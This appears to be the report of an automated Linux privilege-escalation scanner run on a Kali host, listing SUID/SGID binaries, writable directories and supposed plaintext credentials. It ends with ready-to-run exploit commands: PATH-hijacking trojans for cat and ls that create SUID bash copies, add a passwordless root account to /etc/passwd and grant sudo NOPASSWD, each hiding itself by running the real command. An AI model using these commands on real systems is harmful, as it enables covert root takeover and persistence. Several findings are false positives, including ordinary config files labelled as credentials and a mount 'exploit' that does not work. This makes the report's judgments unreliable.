+[8] Suid Binary
+  Path: /usr/libexec/polkit-agent-helper-1
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[9] Suid Binary
+  Path: /usr/bin/rsh-redone-rlogin
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[10] Suid Binary
+  Path: /usr/bin/ntfs-3g
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[11] Suid Binary
+  Path: /usr/bin/pkexec
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[12] Suid Binary
+  Path: /usr/bin/rsh
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[13] Suid Binary
+  Path: /usr/bin/mount
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: -o bind /bin/bash /bin/mount && /bin/mount -p
+  Is Exploitable: True
+
+[14] Suid Binary
+  Path: /usr/bin/sudoedit
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[15] Suid Binary
+  Path: /usr/bin/fusermount3
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[16] Suid Binary
+  Path: /usr/bin/fusermount
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[17] Suid Binary
+  Path: /usr/bin/rlogin
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[18] Suid Binary
+  Path: /usr/bin/gpasswd
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[19] Suid Binary
+  Path: /usr/bin/chfn
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[20] Suid Binary
+  Path: /usr/bin/sg
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[21] Suid Binary
+  Path: /usr/bin/su
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[22] Suid Binary
+  Path: /usr/bin/newgrp
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[23] Suid Binary
+  Path: /usr/bin/chsh
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[24] Suid Binary
+  Path: /usr/bin/sudo
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[25] Suid Binary
+  Path: /usr/bin/umount
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[26] Suid Binary
+  Path: /usr/bin/rsh-redone-rsh
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[27] Suid Binary
+  Path: /usr/sbin/mount.smb3
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[28] Suid Binary
+  Path: /usr/sbin/mount.nfs
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[29] Suid Binary
+  Path: /usr/sbin/mount.nfs4
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[30] Suid Binary
+  Path: /usr/sbin/umount.nfs
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[31] Suid Binary
+  Path: /usr/sbin/mount.ntfs-3g
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[32] Suid Binary
+  Path: /usr/sbin/umount.nfs4
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[33] Suid Binary
+  Path: /usr/bin/passwd
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[34] Suid Binary
+  Path: /usr/sbin/mount.ntfs
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[35] Suid Binary
+  Path: /usr/sbin/mount.cifs
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[36] Suid Binary
+  Path: /usr/sbin/pppd
+  Owner: root
+  Group: dip
+  Permissions: 4754
+  Exploit Method: 
+  Is Exploitable: False
+
+[37] Sgid Binary
+  Path: /etc/alternatives/locate
+  Owner: root
+  Group: plocate
+  Permissions: 2755
+  Is Exploitable: False
+
+[38] Sgid Binary
+  Path: /usr/lib/x86_64-linux-gnu/utempter/utempter
+  Owner: root
+  Group: utmp
+  Permissions: 2755
+  Is Exploitable: False
+
+[39] Sgid Binary
+  Path: /usr/lib/xorg/Xorg.wrap
+  Owner: root
+  Group: root
+  Permissions: 6755
+  Is Exploitable: False
+
+[40] Sgid Binary
+  Path: /usr/bin/dotlockfile
+  Owner: root
+  Group: mail
+  Permissions: 2755
+  Is Exploitable: False
+
+[41] Sgid Binary
+  Path: /usr/bin/plocate
+  Owner: root
+  Group: plocate
+  Permissions: 2755
+  Is Exploitable: False
+
+[42] Sgid Binary
+  Path: /usr/bin/expiry
+  Owner: root
+  Group: shadow
+  Permissions: 2755
+  Is Exploitable: True
+
+[43] Sgid Binary
+  Path: /usr/bin/locate
+  Owner: root
+  Group: plocate
+  Permissions: 2755
+  Is Exploitable: False
+
+[44] Sgid Binary
+  Path: /usr/bin/ssh-agent
+  Owner: root
+  Group: _ssh
+  Permissions: 2755
+  Is Exploitable: True
+
+[45] Sgid Binary
+  Path: /usr/bin/crontab
+  Owner: root
+  Group: crontab
+  Permissions: 2755
+  Is Exploitable: True
+
+[46] Sgid Binary
+  Path: /usr/sbin/unix_chkpwd
+  Owner: root
+  Group: shadow
+  Permissions: 2755
+  Is Exploitable: True
+
+[47] Sgid Binary
+  Path: /usr/bin/chage
+  Owner: root
+  Group: shadow
+  Permissions: 2755
+  Is Exploitable: True
+
+[48] World Writable Directory
+  Path: /tmp/.ICE-unix
+  Owner: root
+  Group: root
+  Permissions: 1777
+  Is Critical: False
+
+[49] World Writable Directory
+  Path: /tmp
+  Owner: root
+  Group: root
+  Permissions: 1777
+  Is Critical: False
+
+[50] Plaintext Credentials
+  Path: /etc/idmapd.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    nobody
+Nobody-Group = nogroup
+
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}
+  Is Exploitable: True
+
+[51] Plaintext Credentials
+  Path: /etc/nsswitch.conf
+  Pattern: (?i)passwd\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    files systemd winbind
+group:          files systemd winbind
+shadow:         files systemd
+gshadow:        files systemd
+
+hosts:          files mdns4_minimal [NOTFOUND=return] dns
+networks:       files
+
+protocols:      db files
+services:       db files
+ethers:         db files
+rpc:            db files
+
+netgroup:       nis
+
+  Creds Data:
+    {'pattern': '(?i)passwd\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n']}
+  Is Exploitable: True
+
+[52] Plaintext Credentials
+  Path: /etc/apparmor/parser.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    :other
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': [':other']}
+  Is Exploitable: True
+
+[53] Plaintext Credentials
+  Path: /etc/unicornscan/modules.conf
+  Pattern: (?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    scanit! host=localhost dbname=scan
+    scanit!
+  Creds Data:
+    {'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scanit! host=localhost dbname=scan', 'scanit!']}
+    {'pattern': '(?i)username\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scan']}
+  Is Exploitable: True
+
+[54] Plaintext Credentials
+  Path: /etc/redsocks.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    redsocks;
+	group = redsocks;
+	// chroot = 
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['redsocks;\n\tgroup = redsocks;\n\t// chroot = ']}
+  Is Exploitable: True
+
+[55] Plaintext Credentials
+  Path: /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    root
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}
+  Is Exploitable: True
+
+[56] Plaintext Credentials
+  Path: /var/lib/ucf/cache/:etc:idmapd.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    nobody
+Nobody-Group = nogroup
+
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}
+  Is Exploitable: True
+
+[57] Plaintext Credentials
+  Path: /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    cups-pk-helper
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['cups-pk-helper']}
+  Is Exploitable: True
+
+[58] Plaintext Credentials
+  Path: /etc/sqlmap/sqlmap.conf
+  Pattern: (?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    guessme
+requestFile = 
+
+# Rather than providing a target URL, let Google return target
+# hosts as result of your Google dork expression. For a list of Google
+# 
+  Creds Data:
+    {'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# ']}
+  Is Exploitable: True
+
+[59] Plaintext Credentials
+  Path: /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf
+  Pattern: (?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?
+  Matches:
+    root
+  Creds Data:
+    {'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}
+  Is Exploitable: True
+
+[60] Writable Path Directory
+  Path: /home/kali/.local/bin
+  Owner: kali
+  Group: kali
+  Permissions: 0755
+  Is Exploitable: True
+
+[61] Path Hijacking
+  Command: cat
+  Writable Directory: /home/kali/.local/bin
+  Is Exploitable: True
+
+[62] Path Hijacking
+  Command: ls
+  Writable Directory: /home/kali/.local/bin
+  Is Exploitable: True
+
+[63] History File Exposure
+  Path: /home/kali/.bash_history
+  Pattern: (?i)passwd
+  Matches:
+    passwd
+  Is Exploitable: True
+
+EXPLOITS DETAILS
+--------------------------------------------------------------------------------
+[1] Suid Binary
+  Description: Exploit SUID binary mount to get a shell with elevated privileges
+  Command: /usr/bin/mount -o bind /bin/bash /bin/mount && /bin/mount -p
+
+[2] Path Hijacking
+  Description: Create a malicious cat binary in /tmp/.ICE-unix to make /bin/bash SUID
+  Command: echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/.ICE-unix/cat && chmod +x /tmp/.ICE-unix/cat
+
+[3] Path Hijacking
+  Description: Create a malicious ls binary in /tmp/.ICE-unix to make /bin/bash SUID
+  Command: echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/.ICE-unix/ls && chmod +x /tmp/.ICE-unix/ls
+
+[4] Path Hijacking
+  Description: Create a malicious cat binary in /tmp to make /bin/bash SUID
+  Command: echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cat && chmod +x /tmp/cat
+
+[5] Path Hijacking
+  Description: Create a malicious ls binary in /tmp to make /bin/bash SUID
+  Command: echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/ls && chmod +x /tmp/ls
+
+[6] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/idmapd.conf
+  Command: cat /etc/idmapd.conf
+
+[7] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/nsswitch.conf
+  Command: cat /etc/nsswitch.conf
+
+[8] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/apparmor/parser.conf
+  Command: cat /etc/apparmor/parser.conf
+
+[9] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/unicornscan/modules.conf
+  Command: cat /etc/unicornscan/modules.conf
+
+[10] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/redsocks.conf
+  Command: cat /etc/redsocks.conf
+
+[11] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf
+  Command: cat /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf
+
+[12] Plaintext Credentials
+  Description: Extract plaintext credentials from /var/lib/ucf/cache/:etc:idmapd.conf
+  Command: cat /var/lib/ucf/cache/:etc:idmapd.conf
+
+[13] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf
+  Command: cat /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf
+
+[14] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/sqlmap/sqlmap.conf
+  Command: cat /etc/sqlmap/sqlmap.conf
+
+[15] Plaintext Credentials
+  Description: Extract plaintext credentials from /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf
+  Command: cat /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf
+
+[16] Path Hijacking
+  Description: Create a malicious ls binary in /home/kali/.local/bin (which is in PATH) to escalate privileges
+  Command: echo '#!/bin/bash\nchmod +s /bin/bash' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
+
+[17] Path Hijacking Bash Copy
+  Description: Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for cat
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Create a copy of bash with SUID permissions
+    cp /bin/bash /tmp/.privbash-1742213746
+    chmod 4755 /tmp/.privbash-1742213746
+
+    # Leave evidence of successful execution
+    echo "[+] Privilege escalation successful via cat path hijacking at $(date)" > /tmp/.privesc-success-1742213746
+
+    # Run the original command to avoid detection
+    cat "$@"
+    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat
+
+[18] Path Hijacking Add User
+  Description: Create a malicious cat that will add a new root user to /etc/passwd
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for cat
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Try to add a new root user
+    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd
+    echo "privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null
+
+    # Leave evidence of successful execution
+    echo "[+] User added via cat path hijacking at $(date)" > /tmp/.privesc-useradd-1742213746
+
+    # Run the original command to avoid detection
+    cat "$@"
+    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat
+
+[19] Path Hijacking Sudo Exploit
+  Description: Create a malicious cat that tries various sudo techniques to gain root access
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for cat
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Try to use sudo to create a SUID binary
+    echo '#!/bin/bash
+    if [ $(id -u) -eq 0 ]; then
+        cp /bin/bash /tmp/.rootshell-1742213746
+        chmod 4755 /tmp/.rootshell-1742213746
+        echo "Root shell created at /tmp/.rootshell-1742213746"
+    fi' > /tmp/.sudoscript-1742213746
+    chmod +x /tmp/.sudoscript-1742213746
+
+    # Try various privilege escalation techniques silently
+    sudo /tmp/.sudoscript-1742213746 2>/dev/null || true
+    sudo -n /tmp/.sudoscript-1742213746 2>/dev/null || true
+
+    # Try to modify sudoers file
+    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers 2>/dev/null || true
+
+    # Leave evidence of execution attempt
+    echo "[+] Sudo exploitation attempt via cat path hijacking at $(date)" > /tmp/.privesc-sudo-1742213746
+
+    # Run the original command to avoid detection
+    cat "$@"
+    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat
+
+[20] Path Hijacking Bash Copy
+  Description: Create a malicious ls binary in /home/kali/.local/bin that will create a SUID bash copy
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for ls
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Create a copy of bash with SUID permissions
+    cp /bin/bash /tmp/.privbash-1742213746
+    chmod 4755 /tmp/.privbash-1742213746
+
+    # Leave evidence of successful execution
+    echo "[+] Privilege escalation successful via ls path hijacking at $(date)" > /tmp/.privesc-success-1742213746
+
+    # Run the original command to avoid detection
+    ls "$@"
+    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
+
+[21] Path Hijacking Add User
+  Description: Create a malicious ls that will add a new root user to /etc/passwd
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for ls
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Try to add a new root user
+    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd
+    echo "privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash" >> /etc/passwd 2>/dev/null
+
+    # Leave evidence of successful execution
+    echo "[+] User added via ls path hijacking at $(date)" > /tmp/.privesc-useradd-1742213746
+
+    # Run the original command to avoid detection
+    ls "$@"
+    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
+
+[22] Path Hijacking Sudo Exploit
+  Description: Create a malicious ls that tries various sudo techniques to gain root access
+  Command: echo '#!/bin/bash
+    # Path hijacking exploit for ls
+    # Created by Advanced Linux Privilege Escalation Tool
+
+    # Try to use sudo to create a SUID binary
+    echo '#!/bin/bash
+    if [ $(id -u) -eq 0 ]; then
+        cp /bin/bash /tmp/.rootshell-1742213746
+        chmod 4755 /tmp/.rootshell-1742213746
+        echo "Root shell created at /tmp/.rootshell-1742213746"
+    fi' > /tmp/.sudoscript-1742213746
+    chmod +x /tmp/.sudoscript-1742213746
+
+    # Try various privilege escalation techniques silently
+    sudo /tmp/.sudoscript-1742213746 2>/dev/null || true
+    sudo -n /tmp/.sudoscript-1742213746 2>/dev/null || true
+
+    # Try to modify sudoers file
+    echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers 2>/dev/null || true
+
+    # Leave evidence of execution attempt
+    echo "[+] Sudo exploitation attempt via ls path hijacking at $(date)" > /tmp/.privesc-sudo-1742213746
+
+    # Run the original command to avoid detection
+    ls "$@"
+    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls
+
+[23] History File Exposure
+  Description: Extract sensitive information from history file /home/kali/.bash_history
+  Command: cat /home/kali/.bash_history | grep -E '(password|ssh|key|token)'
+
+================================================================================
+End of Report
+================================================================================
